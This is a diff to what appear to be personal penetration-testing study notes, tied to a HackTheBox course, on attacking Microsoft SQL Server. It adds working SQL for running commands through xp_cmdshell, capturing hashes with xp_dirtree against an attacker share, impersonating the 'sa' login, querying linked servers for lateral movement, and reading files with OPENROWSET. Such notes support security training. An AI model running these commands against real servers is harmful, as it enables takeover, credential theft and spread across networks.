@@ -105,11 +105,64 @@ mfs6> set PASSWORD password
 mfs6> set USE_WINDOWS_AUTHENT true
 mfs6> run
 ```
-</div><div>
 
-#### Exploitation
+#### Exploitation - Part I
 
 [![attacking_common_services](../../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
+
+* [`xp_cmdshell`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) can be used to run commands. It's disabled by default. The command is runs with the same permissions as the server.
+
+```sql!
+-- EXECUTE sp_configure 'show advanced options', 1
+-- RECONFIGURE
+-- EXECUTE sp_configure 'xp_cmdshell', 1
+-- RECONFIGURE
+xp_cmdshell 'whoami'
+```
+
+* We can steal hashes by setting up a [responder](/cybersecurity/red-team/_knowledge/topics/request_grabber.md#responder)
+
+```sql!
+EXEC master..xp_dirtree '\\IP\share\'
+EXEC master..xp_subdirs '\\IP\share\'
+```
+
+* We may be able to impersonate users:
+
+```sql!
+-- list users we can impersonate
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+-- impersonate user 'sa'
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
+REVERT # cancel impersonation
+```
+</div><div>
+
+#### Exploitation - Part II
+
+* Extended Store Procedures
+* CLR Assemblies
+* SQL Server Agent Jobs
+* External Scripts
+* `xp_regwrite` can be used to create registry entries
+* User Defined Functions in C/C++ ([ex](https://github.com/mysqludf/lib_mysqludf_sys))
+
+#### Lateral Movement
+
+The current server may be linked to other servers. If we compromise it, we may be able to run SQL queries on linked servers.
+
+* List Linked Servers
+
+```sql!
+SELECT srvname, isremote FROM sysservers
+```
+
+* Execute a SQL Query on a Linked Server
+
+```sql!
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [your_target_here]
+```
 
 #### Additional Notes
 
@@ -137,6 +190,19 @@ SELECT name FROM master.dbo.sysdatabases
 SELECT table_name FROM xxx.INFORMATION_SCHEMA.TABLES
 ```
 </div><div>
+
+Write files
+
+```sql!
+-- enable to write
+sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
+-- use it...
+-- can read any file
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+```
 
 SSMS
 
